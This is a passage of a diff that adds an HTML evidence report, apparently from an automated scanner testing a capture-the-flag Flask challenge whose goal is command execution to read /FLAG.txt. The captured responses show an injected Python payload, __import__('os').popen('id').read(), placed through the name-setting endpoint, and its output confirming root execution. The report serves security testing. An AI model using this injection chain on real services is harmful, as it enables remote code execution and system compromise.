+            border-bottom: 1px solid #dddddd;
+        }
+
+        th {
+            background-color: #f4f4f4;
+        }
+
+        td {
+            background-color: #fafafa;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;API Dashboard&lt;/h1&gt;
+        &lt;p&gt;The goal of this challenge is to get command execution on the flask_app container, and grab the file /FLAG.txt&lt;/p&gt;
+        &lt;section&gt;
+            &lt;h2&gt;API URL&lt;/h2&gt;
+            &lt;div&gt;
+                &lt;p id=&quot;apiResult&quot;&gt;&lt;/p&gt;
+                &lt;p&gt;&lt;a href=&quot;/api/set?url=http://flask_api:8081/script&quot; target=&quot;_blank&quot;&gt;reset&lt;/a&gt;&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/section&gt;
+        &lt;section&gt;
+            &lt;h2&gt;Name Management&lt;/h2&gt;
+            &lt;div&gt;
+                &lt;p id=&quot;nameResult&quot;&gt;&lt;/p&gt;
+                &lt;p&gt;&lt;a href=&quot;/name/set?name=Cocomelon&quot; target=&quot;_blank&quot;&gt;reset&lt;/a&gt;&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/section&gt;
+        &lt;section&gt;
+            &lt;h2&gt;Hosts&lt;/h2&gt;
+            &lt;table&gt;
+                &lt;thead&gt;
+                    &lt;tr&gt;
+                        &lt;th&gt;Name&lt;/th&gt;
+                        &lt;th&gt;URL&lt;/th&gt;
+                        &lt;th&gt;Mapping&lt;/th&gt;
+                    &lt;/tr&gt;
+                &lt;/thead&gt;
+                &lt;tbody&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Nginx Root&lt;/td&gt;
+                        &lt;td&gt;http://nginx:80/&lt;/td&gt;
+                        &lt;td&gt;http://nginx:80/&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Flask App&lt;/td&gt;
+                        &lt;td&gt;http://flask_app:8080&lt;/td&gt;
+                        &lt;td&gt;http://nginx:80/app/&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Flask API&lt;/td&gt;
+                        &lt;td&gt;http://flask_api:8081&lt;/td&gt;
+                        &lt;td&gt;http://nginx:8081/&lt;/td&gt;
+                    &lt;/tr&gt;
+                &lt;/tbody&gt;
+            &lt;/table&gt;
+        &lt;/section&gt;
+    &lt;/div&gt;
+    &lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+        fetchApiData();
+        fetchName();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz4jypn-c4</code> — <code>artifacts/s-0018/ev-mqz4jypn-c4/</code></div><div class="lbl">REQUEST</div><pre>GET /app HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-length: 1114
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:18:36 GMT
+server: nginx/1.31.2
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Smart API Nanoservice&lt;/title&gt;
+    &lt;style&gt;
+        body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    margin: 40px;
+    }
+
+    .status {
+        margin-bottom: 20px;
+        font-size: 24px;
+    }
+
+    .result {
+        margin-bottom: 20px;
+        font-size: 20px;
+        color: green;
+    }
+
+    footer {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background-color: #f0f0f0;
+        font-size: 14px;
+        text-align: center;
+        padding: 10px;
+    }
+
+
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;result&quot;&gt;uid=0(root) gid=0(root) groups=0(root)
+&lt;/div&gt;
+    &lt;footer&gt;
+
+        &lt;!-- http://nginx/api/get http://nginx/api/set?url=value --&gt;
+        &lt;small&gt;api: http://nginx:80/name/get&lt;/small&gt;&lt;br&gt;
+        &lt;!-- http://nginx/name/get http://nginx/name/set?name=value --&gt;
+        &lt;small&gt;name: {&amp;#34;script&amp;#34;:&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;}&lt;/small&gt;
+    &lt;/footer&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz4l3fv-c5</code> — <code>artifacts/s-0018/ev-mqz4l3fv-c5/</code></div><div class="lbl">REQUEST</div><pre>GET /app HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-length: 1114
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 11:19:29 GMT
+server: nginx/1.31.2
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Smart API Nanoservice&lt;/title&gt;
+    &lt;style&gt;
+        body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    margin: 40px;
+    }
+
+    .status {
+        margin-bottom: 20px;
+        font-size: 24px;
+    }
+
+    .result {
+        margin-bottom: 20px;
+        font-size: 20px;
+        color: green;
+    }
+
+    footer {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background-color: #f0f0f0;
+        font-size: 14px;
+        text-align: center;
+        padding: 10px;
+    }
+
+
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;result&quot;&gt;uid=0(root) gid=0(root) groups=0(root)
+&lt;/div&gt;
+    &lt;footer&gt;
+
+        &lt;!-- http://nginx/api/get http://nginx/api/set?url=value --&gt;
+        &lt;small&gt;api: http://nginx:80/name/get&lt;/small&gt;&lt;br&gt;
+        &lt;!-- http://nginx/name/get http://nginx/name/set?name=value --&gt;
+        &lt;small&gt;name: {&amp;#34;script&amp;#34;:&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;}&lt;/small&gt;
+    &lt;/footer&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
